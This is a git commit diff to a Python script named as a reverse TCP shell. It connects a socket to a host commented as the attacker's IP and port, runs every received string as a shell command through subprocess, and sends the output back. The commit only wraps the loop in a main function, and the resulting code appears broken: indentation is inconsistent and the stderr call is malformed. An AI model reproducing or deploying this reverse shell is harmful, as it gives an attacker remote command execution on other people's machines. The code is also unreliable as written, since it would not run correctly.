0529e42fcc8e69fb63ae5f99c631802dcfd67712
Eoin <eoin.finney@gmail.com>
2019-08-29 12:40:14 +0100

    Update python_reverse_tcp_shell.py

--- scripts/python_reverse_tcp_shell.py
+++ scripts/python_reverse_tcp_shell.py
@@ -8,8 +8,8 @@ s=socket.socket()						## Shorthand object s
 
 s.connect(("127.0.0.1",1234))			## Attackers IP address and port
 
-
-while 1:
+def main():
+    while 1:
 	## p reads the first 1024KB of the tcp socket
 	p=subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 	s.send(p.stdout.read()+stderr.read())
